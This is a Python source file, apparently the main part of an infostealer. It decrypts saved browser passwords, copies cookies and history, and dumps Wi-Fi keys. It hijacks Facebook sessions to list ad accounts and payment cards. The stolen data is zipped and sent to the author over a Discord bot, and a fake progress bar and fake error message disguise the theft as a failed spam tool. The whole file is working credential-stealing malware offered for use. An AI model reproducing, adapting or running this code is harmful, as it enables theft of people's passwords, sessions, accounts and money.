        def safe_remove(file_path):
            for _ in range(3):
                try:
                    if os.path.exists(file_path):
                        os.remove(file_path)
                    return True
                except:
                    time.sleep(1)
            return False

        def save_login_data():
            count = 0
            result = ""
            for profile in profiles:
                profile_name = os.path.basename(profile)
                try:
                    logins_path = os.path.join(profile, "logins.json")
                    if not os.path.exists(logins_path):
                        continue
                    with open(logins_path, "r") as f:
                        json_logins = json.load(f)
                    if "logins" not in json_logins:
                        continue
                    key = self.get_gecko_key(profile)
                    if not key:
                        continue
                    for row in json_logins["logins"]:
                        enc_username, enc_password = row["encryptedUsername"], row["encryptedPassword"]
                        username = self.decode_gecko_login(key, enc_username)
                        password = self.decode_gecko_login(key, enc_password)
                        if row["hostname"] and username and password:
                            result += f"URL: {row['hostname']}\nUsername: {username}\nPassword: {password}\nApplication: {browser} [Profile: {profile_name}]\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                            count += 1
                            for keyword in ImportantKeywords:
                                if keyword in row["hostname"].lower():
                                    os.makedirs(os.path.join(self.temp_path, f"Browsers/{browser}/Passwords"), exist_ok=True)
                                    with open(os.path.join(self.temp_path, f"Browsers/{browser}/Passwords/Important_Logins.txt"), "a", encoding="utf-8") as f:
                                        f.write(result)
                                    break
                except Exception as e:
                    continue
            if count:
                os.makedirs(os.path.join(self.temp_path, f"Browsers/{browser}/Passwords"), exist_ok=True)
                with open(os.path.join(self.temp_path, f"Browsers/{browser}/Passwords/{browser}_Passwords.txt"), "a", encoding="utf-8") as f:
                    f.write(result)
            self.update_progress(2.0)
            return count

        def save_cookies():
            count = 0
            result = ""
            fb_cookies = []
            for profile in profiles:
                profile_name = os.path.basename(profile)
                cookies_db = os.path.join(profile, "cookies.sqlite")
                if not os.path.isfile(cookies_db):
                    continue
                temp_db = os.path.join(self.temp_path, f"cookie_db_{profile_name}")
                if not safe_copy(cookies_db, temp_db):
                    continue
                try:
                    conn = sqlite3.connect(f"file:{temp_db}?mode=ro", uri=True)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host, path, name, value, isSecure, isHttpOnly, expiry FROM moz_cookies")
                    for row in cursor.fetchall():
                        if not all(row[:4]):
                            continue
                        result += f"{row[0]}\t{'TRUE' if row[4] else 'FALSE'}\t{row[1]}\t{'TRUE' if row[5] else 'FALSE'}\t{row[6]}\t{row[2]}\t{row[3]}\n"
                        if row[0] == ".facebook.com":
                            fb_cookies.append(f"{row[2]}={row[3]}")
                        count += 1
                    conn.close()
                    if count:
                        os.makedirs(os.path.join(self.temp_path, f"Browsers/{browser}/Cookies"), exist_ok=True)
                        with open(os.path.join(self.temp_path, f"Browsers/{browser}/Cookies/{browser}_{profile_name}_Cookies.txt"), "w", encoding="utf-8") as f:
                            f.writelines(result)
                        if Facebook is not None and "c_user" in ";".join(fb_cookies):
                            fb_data = Facebook(";".join(fb_cookies)).ADS_Checker()
                            if fb_data:
                                os.makedirs(os.path.join(self.temp_path, f"Browsers/{browser}/Facebook"), exist_ok=True)
                                with open(os.path.join(self.temp_path, f"Browsers/{browser}/Facebook/{browser}_{profile_name}_Facebook_Cookies.txt"), "a", encoding="utf-8") as f:
                                    f.write(f"Cookie: {';'.join(fb_cookies)}\n\n{fb_data}\n\n\n")
                    self.update_progress(2.0)
                except Exception as e:
                    continue
                finally:
                    safe_remove(temp_db)
            return count

        def save_history():
            count = 0
            result = ""
            important_result = ""
            for profile in profiles:
                profile_name = os.path.basename(profile)
                history_db = os.path.join(profile, "places.sqlite")
                if not os.path.isfile(history_db):
                    continue
                temp_db = os.path.join(self.temp_path, f"history_db_{profile_name}")
                if not safe_copy(history_db, temp_db):
                    continue
                try:
                    conn = sqlite3.connect(f"file:{temp_db}?mode=ro", uri=True)
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title, visit_count, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 500")
                    for row in cursor.fetchall():
                        if not row[0]:
                            continue
                        last_visit = datetime.datetime.fromtimestamp(row[3] / 1000000) if row[3] else "Unknown"
                        entry = f"URL: {row[0]}\nTitle: {row[1]}\nVisit Count: {row[2]}\nLast Visit: {last_visit}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        result += entry
                        count += 1
                        for keyword in ImportantKeywords:
                            if keyword in row[0].lower():
                                important_result += entry
                                break
                    conn.close()
                    if count:
                        os.makedirs(os.path.join(self.temp_path, f"Browsers/{browser}/History"), exist_ok=True)
                        with open(os.path.join(self.temp_path, f"Browsers/{browser}/History/{browser}_{profile_name}_History.txt"), "w", encoding="utf-8") as f:
                            f.writelines(result)
                        if important_result:
                            os.makedirs(os.path.join(self.temp_path, f"Browsers/{browser}/History"), exist_ok=True)
                            with open(os.path.join(self.temp_path, f"Browsers/{browser}/History/{browser}_{profile_name}_Important_History.txt"), "w", encoding="utf-8") as f:
                                f.writelines(important_result)
                    self.update_progress(2.0)
                except Exception as e:
                    continue
                finally:
                    safe_remove(temp_db)
            return count

        threads = []
        # Each func call contributes to total progress, but actual progress is controlled by show_progress_bar
        for func in [save_login_data, save_cookies, save_history]:
            func_name = func.__name__
            attr_name = 'total_logins' if func_name == 'save_login_data' else f"total_{func_name.split('_')[1]}"
            thread = threading.Thread(target=lambda: setattr(self, attr_name, getattr(self, attr_name) + func()))
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()

    async def extract_wifi_data(self):
        if aiohttp is None:
            os.makedirs(os.path.join(self.temp_path, "WiFi"), exist_ok=True)
            with open(os.path.join(self.temp_path, "WiFi/wifi_info.txt"), "w", encoding="utf-8") as f:
                f.write("Wi-Fi data collection skipped due to missing aiohttp.")
            self.update_progress(5.0)
            return

        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as session:
            networks = {}
            try:
                output_networks = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True).stdout.strip()
                profiles = [line.split(":")[1].strip() for line in output_networks.split("\n") if "Profile" in line]
                for profile in profiles:
                    if profile:
                        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", profile, "key=clear"], capture_output=True, text=True).stdout.strip()
                        match = re.search(r"Key Content\s*:\s*(.+)", profile_info)
                        networks[profile] = match.group(1).strip() if match else "No password found"
                
                router_ip = None
                output = subprocess.run("ipconfig", capture_output=True, text=True).stdout.strip()
                for line in output.splitlines():
                    if "Default Gateway" in line:
                        router_ip = line.split(":")[1].strip()
                        break
                
                mac_address = "MAC address not found"
                if router_ip:
                    subprocess.run(f"ping -n 1 {router_ip}", capture_output=True)
                    arp_output = subprocess.run(f"arp -a {router_ip}", capture_output=True, text=True).stdout.strip()
                    mac_address_match = re.search(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})", arp_output)
                    mac_address = mac_address_match.group() if mac_address_match else "MAC address not found"
                
                vendor_info = "Vendor info not found"
                if mac_address != "MAC address not found":
                    try:
                        async with session.get(f"https://api.macvendors.com/{mac_address}") as response:
                            if response.status == 200:
                                vendor_info = await response.text()
                    except:
                        pass
                
                os.makedirs(os.path.join(self.temp_path, "WiFi"), exist_ok=True)
                with open(os.path.join(self.temp_path, "WiFi/wifi_info.txt"), "w", encoding="utf-8") as f:
                    f.write(f'''
**Router IP Address:** `{router_ip or 'Failed to get router IP'}`
**Router MAC Address:** `{mac_address}`
**Router Vendor:** `{vendor_info}`
**Saved Wi-Fi Networks:**
''')
                    if networks:
                        for network, password in networks.items():
                            f.write(f"- `{network}`: `{password}`\n")
                    else:
                        f.write("No Wi-Fi networks found.")
                self.update_progress(5.0)
            except Exception as e:
                os.makedirs(os.path.join(self.temp_path, "WiFi"), exist_ok=True)
                with open(os.path.join(self.temp_path, "WiFi/wifi_info.txt"), "w", encoding="utf-8") as f:
                    f.write(f"Error occurred during Wi-Fi data collection: {e}")
                self.update_progress(5.0)
            finally:
                await session.close()

    def create_zip_files(self, ip_info, country_code, ip_address):
        archive_base_name = f"[{country_code}_{ip_address}] {os.getenv('COMPUTERNAME', 'defaultValue')}"
        zip_files = []
        
        all_files_to_zip = []
        for root, _, files in os.walk(self.temp_path):
            for name in files:
                file_path = os.path.join(root, name)
                all_files_to_zip.append(file_path)

        current_zip_size = 0
        part = 1
        
        def create_new_zip_file(file_name):
            zip_path = os.path.join(self.temp_path, file_name)
            zip_files.append(zip_path)
            return zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED, compresslevel=9)

        zip_file_obj = create_new_zip_file(f"{archive_base_name}_part{part}.zip")
        
        zip_comment = f'''
Time Created: {datetime.datetime.now().strftime('%d-%m-%Y (%H:%M:%S)')}
Contact: https://t.me/conkudaden
Total Passwords: {self.total_logins}
Total Cookies: {self.total_cookies}
Total Credit Cards: {self.total_ccards}
Total Autofill: {self.total_autofill}
Total History: {self.total_history}
Total Extensions: {self.total_extensions}
Total Wallets: {self.total_wallets}
Total Telegram Sessions: {self.total_telegram}
'''.encode()
        
        if part == 1:
            zip_file_obj.comment = zip_comment

        for file_path in all_files_to_zip:
            file_size = os.path.getsize(file_path)
            relative_path = os.path.relpath(file_path, self.temp_path)

            if current_zip_size + file_size > MAX_FILE_SIZE and current_zip_size > 0:
                zip_file_obj.close()
                part += 1
                zip_file_obj = create_new_zip_file(f"{archive_base_name}_part{part}.zip")
                zip_file_obj.comment = zip_comment
                current_zip_size = 0
            
            try:
                zip_file_obj.write(file_path, relative_path)
                current_zip_size += file_size
                self.update_progress(0.5)
            except:
                pass

        zip_file_obj.close()
        self.update_progress(10.0)
        return zip_files, f'''
{ip_info}
User: {os.getlogin()}
Browser Data:
- Passwords: {self.total_logins}
- Cookies: {self.total_cookies}
- Credit Cards: {self.total_ccards}
- Autofill: {self.total_autofill}
- History: {self.total_history}
- Extensions: {self.total_extensions}
- Wallets: {self.total_wallets}
- Telegram Sessions: {self.total_telegram}
'''

class Facebook:
    def __init__(self, cookie):
        self.rq = requests.Session()
        cookies = {c.split('=')[0]: c.split('=', 1)[1] for c in cookie.split(';') if '=' in c and c.split('=')[0].lower() in ['c_user', 'xs', 'fr']}
        self.rq.cookies.update(cookies)
        headers = {
            'authority': 'adsmanager.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'
        }
        self.rq.headers.update(headers)
        self.token = self.get_market()
        self.uid = cookies.get('c_user')

    def get_market(self):
        try:
            act = self.rq.get('https://adsmanager.facebook.com/adsmanager/manage').text
            idx = act.split("act=")[1].split('&')[0]
            list_token = self.rq.get(f'https://adsmanager.facebook.com/adsmanager/manage/campaigns?act={idx}&breakdown_regrouping=1&nav_source=no_referrer').text
            return list_token.split('function(){window.__accessToken="')[1].split('";')[0]
        except:
            return False

    def get_info_tkqc(self):
        if not self.token:
            return ""
        try:
            list_tkqc = self.rq.get(f"https://graph.facebook.com/v17.0/me/adaccounts?fields=account_id&access_token={self.token}")
            data = f"Tổng Số TKQC: {len(list_tkqc.json()['data'])}\n"
            for item in list_tkqc.json()['data']:
                x = self.rq.get(f"https://graph.facebook.com/v16.0/{item['id']}?fields=spend_cap,balance,amount_spent,adtrust_dsl,adspaymentcycle,currency,account_status,disable_reason,name,created_time,all_payment_methods{{pm_credit_card{{display_string,is_verified}}}}&access_token={self.token}").json()
                status = "LIVE" if x.get("account_status") == 1 else "DIE"
                payment = "Không Thẻ"
                try:
                    card_data = x["all_payment_methods"]["pm_credit_card"]["data"]
                    payment = f"{card_data[0]['display_string']} - {'Đã Xác Minh' if card_data[0]['is_verified'] else 'No_Verified'}"
                except:
                    pass
                threshold = "{:.2f}".format(float(x.get("adspaymentcycle", {}).get("data", [{}])[0].get("threshold_amount", 0)) / 100) if x.get("adspaymentcycle") else "0"
                data += f"- Tên TKQC: {x['name']}|ID_TKQC: {x['id']}|Trạng Thái: {status}|Tiền Tệ: {x['currency']}|Số Dư: {x['balance']} {x['currency']}|Đã Tiêu Vào Ngưỡng: {x['spend_cap']} {x['currency']}|Tổng Đã Chi Tiêu: {x['amount_spent']} {x['currency']}|Limit Ngày: {'No Limit' if x['adtrust_dsl'] == -1 else x['adtrust_dsl']} {x['currency']}|Ngưỡng: {threshold} {x['currency']}|Thanh Toán: {payment}|Ngày Tạo: {x['created_time'][:10]}\n"
            return data
        except:
            return ""

    def get_page(self):
        try:
            data = self.rq.get(f"https://graph.facebook.com/v17.0/me/facebook_pages?fields=name,link,fan_count,followers_count,verification_status&access_token={self.token}").json()
            if 'data' in data:
                pages = data["data"]
                result = f"Tổng Số Page: {len(pages)}\n"
                for page in pages:
                    result += f"- {page['name']}|{page['link']}|{page['fan_count']}|{page['followers_count']}|{page['verification_status']}\n"
                return result
            return "==> Không có Page\n"
        except:
            return ""

    def get_qtv_gr(self):
        try:
            data = self.rq.get(f"https://graph.facebook.com/v17.0/me/groups?fields=administrator&access_token={self.token}").json()
            ids = "Các Group Cầm QTV:\n" if any(item["administrator"] for item in data.get("data", [])) else "===> Không Có Group Cầm QTV"
            for item in data.get("data", []):
                if item["administrator"]:
                    ids += f"- https://www.facebook.com/groups/{item['id']}\n"
            return ids
        except:
            return ""

    def get_dtsg(self):
        try:
            rq = self.rq.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed').content.decode('utf-8')
            fb_dtsg = rq.split('name=\\"fb_dtsg\\" value=\\"')[1].split('\\')[0]
            hsi = rq.split('\\"hsi\\":\\"')[1].split('\\",')[0]
            spin_t = rq.split('\\"__spin_t\\":')[1].split(',')[0]
            spin_r = rq.split('__spin_r\\":')[1].split(',')[0]
            jazoest = rq.split('name=\\"jazoest\\" value=\\"')[1].split('\\"')[0]
            return fb_dtsg, hsi, spin_t, spin_r, jazoest
        except:
            return None, None, None, None, None

    def check_slot_bm(self, idbm):
        try:
            fb_dtsg, hsi, spin_t, spin_r, jazoest = self.get_dtsg()
            if not fb_dtsg:
                return "Unknown"
            params = {'business_id': idbm}
            data = {
                '__user': self.uid, '__a': '1', '__req': '6', '__hs': '19577.BP:brands_pkg.2.0..0.0', 'dpr': '1',
                '__ccg': 'EXCELLENT', '__rev': spin_r, '__s': 'vio2ve:9w2u8u:bushdg', '__hsi': hsi, '__dyn': '',
                '__csr': '', 'fb_dtsg': fb_dtsg, 'jazoest': jazoest, 'lsd': 'rLFRv1HDaMzv8jQKSvvUya',
                '__bid': idbm, '__spin_r': spin_r, '__spin_b': 'trunk', '__spin_t': spin_t, '__jssesw': '1'
            }
            check = self.rq.post('https://business.facebook.com/business/adaccount/limits/', params=params, data=data).text
            return json.loads(check.split(');', 1)[1])['payload']['adAccountLimit']
        except:
            return "Unknown"

    def get_tk_in_bm(self):
        try:
            data = self.rq.get(f"https://graph.facebook.com/v17.0/me?fields=businesses&access_token={self.token}").json()
            if "businesses" not in data or not data["businesses"].get("data"):
                return "==> Không có BM\n"
            result = "Thông Tin BM:\n"
            for item in data["businesses"]["data"]:
                idbm = item["id"]
                rq = self.rq.get(f"https://graph.facebook.com/v17.0/{idbm}?fields=owned_ad_accounts{{account_status,balance,currency,business_country_code,amount_spent,spend_cap,created_time,adtrust_dsl}}&access_token={self.token}").json()
                if "owned_ad_accounts" not in rq or not rq["owned_ad_accounts"].get("data"):
                    result += f"- ID_BM: {idbm} --> BM Trắng\n"
                    continue
                for tk in rq["owned_ad_accounts"]["data"]:
                    status = "LIVE" if tk["account_status"] == 1 else "DIE"
                    country = tk.get("business_country_code", "Check Miss")
                    result += f"- ID_BM: {idbm}({self.check_slot_bm(idbm)})|ID_TKQC: {tk['id']}|Trạng Thái: {status}|Quốc Gia: {country}|Tiền Tệ: {tk['currency']}|Số Dư: {tk['balance']} {tk['currency']}|Tổng Đã Chi Tiêu: {tk['amount_spent']} {tk['currency']}|Limit Ngày: {'No Limit' if tk['adtrust_dsl'] == -1 else tk['adtrust_dsl']} {tk['currency']}|Ngưỡng: {tk['spend_cap']} {tk['currency']}|Ngày Tạo: {tk['created_time'][:10]}\n"
            return result
        except:
            return ""

    def ADS_Checker(self):
        try:
            return f"{self.get_info_tkqc()}\n{self.get_tk_in_bm()}\n{self.get_page()}\n{self.get_qtv_gr()}"
        except:
            return ""

async def send_to_discord(zip_files, message_body, extractor):
    if discord is None or commands is None:
        extractor.update_progress(15.0)
        return

    bot = commands.Bot(command_prefix='!', intents=discord.Intents.default())
    
    @bot.event
    async def on_ready():
        try:
            user = await bot.fetch_user(USER_ID)
            embed = discord.Embed(
                title="🔥 Dữ liệu thu thập thành công! 🔥",
                description=message_body,
                color=0x00ff00
            )
            embed.set_footer(text="Contact: https://t.me/conkudaden")
            for attempt in range(5):
                try:
                    await user.send(embed=embed)
                    for zip_file in zip_files:
                        with open(zip_file, 'rb') as f:
                            await user.send(file=discord.File(f, os.path.basename(zip_file)))
                    extractor.update_progress(15.0)
                    break
                except discord.errors.HTTPException:
                    if attempt < 4:
                        await asyncio.sleep(5)
                    else:
                        extractor.update_progress(15.0)
                except Exception as e:
                    print(f"Error sending to Discord: {e}")
                    extractor.update_progress(15.0)
                    break
        except Exception as e:
            print(f"Error in on_ready: {e}")
            extractor.update_progress(15.0)
        finally:
            await bot.close()
    
    try:
        import asyncio
        await bot.start(DISCORD_TOKEN)
    except Exception as e:
        print(f"Error starting Discord bot: {e}")
        extractor.update_progress(15.0)


def show_progress_bar(extractor):
    total_duration_seconds = 120  # 2 minutes
    update_interval = 0.1 # seconds
    num_updates = int(total_duration_seconds / update_interval)
    
    with tqdm(total=100, desc="🔥 Đang load obfuscation vui lòng chờ ít nhất 120s", bar_format="{l_bar}{bar:50}| {percentage:3.2f}%", colour="green") as pbar:
        for i in range(num_updates):
            with extractor.progress_lock:
                # Calculate remaining progress to distribute evenly
                # Ensure progress always increases and reaches 100%
                if extractor.progress < 100:
                    current_fixed_progress = (i / num_updates) * 99 # A bit less than 100 to allow last jump
                    if current_fixed_progress > extractor.progress:
                        extractor.progress = current_fixed_progress
                
                pbar.n = extractor.progress
                pbar.refresh()
            time.sleep(update_interval)
        
        # Ensure it always hits 100% at the end
        with extractor.progress_lock:
            extractor.progress = 100
            pbar.n = 100
            pbar.refresh()

async def main():
    install_missing_libraries()
    perform_dynamic_imports() # Re-evaluate imports after potential installations
    
    extractor = DataExtractor()
    
    progress_thread = threading.Thread(target=show_progress_bar, args=(extractor,))
    progress_thread.start()
    
    # Wrap calls in try-except to prevent crashes if a library is still missing or fails
    try:
        extractor.get_system_info()
    except Exception as e:
        print(f"Error in get_system_info: {e}")
    
    try:
        import asyncio # Ensure asyncio is imported here for its functions
        await extractor.extract_wifi_data()
    except Exception as e:
        print(f"Error in extract_wifi_data: {e}")
    
    try:
        extractor.detect_crypto_wallets()
    except Exception as e:
        print(f"Error in detect_crypto_wallets: {e}")
    
    try:
        extractor.detect_telegram_session()
    except Exception as e:
        print(f"Error in detect_telegram_session: {e}")
    
    for browser, path in ch_dc_browsers.items():
        if not os.path.exists(path):
            continue
        try:
            master_key = extractor.get_master_key(path)
            if not master_key:
                continue
            profile_folders = glob.glob(os.path.join(path, "Profile*")) + [os.path.join(path, "Default")]
            for profile_folder in profile_folders:
                profile = "" if browser in ["Opera", "OperaGX"] else os.path.basename(profile_folder)
                extractor.extract_chromium_data(browser, path, profile, master_key)
        except Exception as e:
            print(f"Error extracting Chromium data for {browser}: {e}")
    
    for browser, basepath in gck_browser_paths.items():
        profiles = []
        try:
            profiles_ini = os.path.join(basepath, "profiles.ini")
            if not os.path.exists(profiles_ini):
                continue
            with open(profiles_ini, "r") as f:
                profiles = [os.path.join(basepath, p.strip()[5:]) for p in re.findall(r"^Path=.+(?s:.)$", f.read(), re.M)]
        except Exception as e:
            print(f"Error parsing profiles.ini for {browser}: {e}")
            continue
        if profiles:
            try:
                extractor.extract_gecko_data(browser, profiles)
            except Exception as e:
                print(f"Error extracting Gecko data for {browser}: {e}")
    
    detected_browsers = extractor.auto_detect_browsers()
    for browser, path in detected_browsers.items():
        if any(b in browser for b in ['Chrome', 'Edge', 'Opera', 'Brave', 'Vivaldi', 'Yandex']):
            try:
                master_key = extractor.get_master_key(path)
                if not master_key:
                    continue
                profile_folders = glob.glob(os.path.join(path, "Profile*")) + [os.path.join(path, "Default")]
                for profile_folder in profile_folders:
                    profile = "" if 'Opera' in browser else os.path.basename(profile_folder)
                    extractor.extract_chromium_data(browser, path, profile, master_key)
            except Exception as e:
                print(f"Error extracting auto-detected Chromium data for {browser}: {e}")
        elif any(b in browser for b in ['Firefox', 'Waterfox', 'Pale Moon', 'SeaMonkey']):
            profiles = []
            try:
                profiles_ini = os.path.join(path, "profiles.ini")
                if not os.path.exists(profiles_ini):
                    continue
                with open(profiles_ini, "r") as f:
                    profiles = [os.path.join(path, p.strip()[5:]) for p in re.findall(r"^Path=.+(?s:.)$", f.read(), re.M)]
            except Exception as e:
                print(f"Error parsing profiles.ini for auto-detected Gecko {browser}: {e}")
                continue
            if profiles:
                try:
                    extractor.extract_gecko_data(browser, profiles)
                except Exception as e:
                    print(f"Error extracting auto-detected Gecko data for {browser}: {e}")
    
    ip_info, country_code, ip_address = await extractor.get_ip_info()
    zip_files, message_body = extractor.create_zip_files(ip_info, country_code, ip_address)
    
    import asyncio # Ensure asyncio is imported here for its functions
    await send_to_discord(zip_files, message_body, extractor)
    
    # Ensure progress bar reaches 100% after all tasks, before cleanup
    with extractor.progress_lock:
        extractor.progress = 100
    
    progress_thread.join() # Wait for the progress bar to finish its animation

    # Final cleanup
    for _ in range(3):
        try:
            shutil.rmtree(extractor.temp_path, ignore_errors=True)
            for zip_file in zip_files:
                if os.path.exists(zip_file):
                    os.remove(zip_file)
            break
        except Exception as e:
            print(f"Error during cleanup: {e}")
            time.sleep(1)
    
    # In thông báo lỗi giả
    print("\n🚨 LỖI: Lỗi TypeError: 'spamsms' is not a function . Vui lòng liên hệ admin hoặc dùng bản khác! 🚨")

if __name__ == "__main__":
    # Check if the script is running in a PyInstaller frozen executable
    if getattr(sys, 'frozen', False):
        # If frozen, ensure base_prefix is used for finding Python executable
        sys.executable = os.path.join(sys._MEIPASS, 'python.exe') # Adjust if necessary

    import asyncio # Ensure asyncio is imported at the top-level for asyncio.run
    asyncio.run(main())